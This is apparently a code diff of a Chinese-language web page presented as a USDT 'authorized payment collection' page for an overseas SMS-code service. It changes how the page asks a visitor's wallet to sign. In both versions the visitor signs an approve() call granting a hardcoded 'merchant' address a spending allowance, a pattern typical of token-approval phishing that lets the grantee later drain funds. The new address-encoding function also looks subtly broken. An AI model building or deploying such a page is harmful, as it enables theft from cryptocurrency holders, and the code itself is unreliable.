@@ -2,40 +2,52 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>專業海內外接碼 - USDT 授權收款</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+<title>海內外接碼 - USDT 授權收款</title>
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 <style>
 body{font-family:sans-serif;text-align:center;padding:40px}
 input{padding:10px;font-size:16px;width:220px}
-button{padding:12px 25px;font-size:16px;margin-top:15px}
+button{padding:10px 20px;font-size:16px;margin-top:10px}
+#qrcode{margin-top:20px}
 </style>
 </head>
-
 <body>
 
-<h2>專業海內外接碼</h2>
-<p>TRC20 USDT 授權付款</p>
+<h2>海內外接碼</h2>
+<p>輸入本次收款金額（USDT）</p>
 
-<input type="number" id="amount" placeholder="輸入金額" step="0.000001">
+<input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
 <br>
-<button onclick="approve()">確認授權</button>
+<button onclick="generate()">生成授權 QR</button>
+
+<div id="qrcode"></div>
 
 <script>
-
+// 你的收款地址
 const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
+// USDT 合約地址
 const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 
 function toSun(amount){
-  return Math.floor(parseFloat(amount) * 1000000)
+  return BigInt(Math.floor(parseFloat(amount) * 1000000))
 }
 
-async function approve(){
+function pad64(hex){
+  return hex.padStart(64, '0')
+}
 
-  if(typeof window.tronWeb === "undefined"){
-    alert("請使用 TokenPocket 或 TronLink 內建瀏覽器開啟")
-    return
+function base58ToHex(address){
+  const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+  let num = BigInt(0)
+  for (let char of address) {
+    num = num * BigInt(58) + BigInt(alphabet.indexOf(char))
   }
+  let hex = num.toString(16)
+  if(hex.length % 2) hex = "0" + hex
+  return hex
+}
 
+function generate(){
   const amountInput = document.getElementById("amount").value
   if(!amountInput || amountInput <= 0){
     alert("請輸入正確金額")
@@ -44,16 +56,30 @@ async function approve(){
 
   const amount = toSun(amountInput)
 
-  const contract = await window.tronWeb.contract().at(usdtContract)
+  let addressHex = base58ToHex(merchant)
+  addressHex = addressHex.substring(2)
 
-  try{
-    await contract.approve(merchant, amount).send()
-    alert("授權成功")
-  }catch(e){
-    alert("交易取消或失敗")
-  }
+  const encodedAddress = pad64(addressHex)
+  const encodedAmount = pad64(amount.toString(16))
+
+  const parameter = encodedAddress + encodedAmount
+
+  const url =
+    "https://link.tronlink.org/#/wallet/contract?contract=" +
+    usdtContract +
+    "&functionSelector=approve(address,uint256)&parameter=" +
+    parameter
+
+  document.getElementById("qrcode").innerHTML = ""
+
+  QRCode.toCanvas(document.createElement("canvas"), url, function (err, canvas) {
+    if(err){
+      alert("生成 QR 失敗")
+      return
+    }
+    document.getElementById("qrcode").appendChild(canvas)
+  })
 }
-
 </script>
 
 </body>
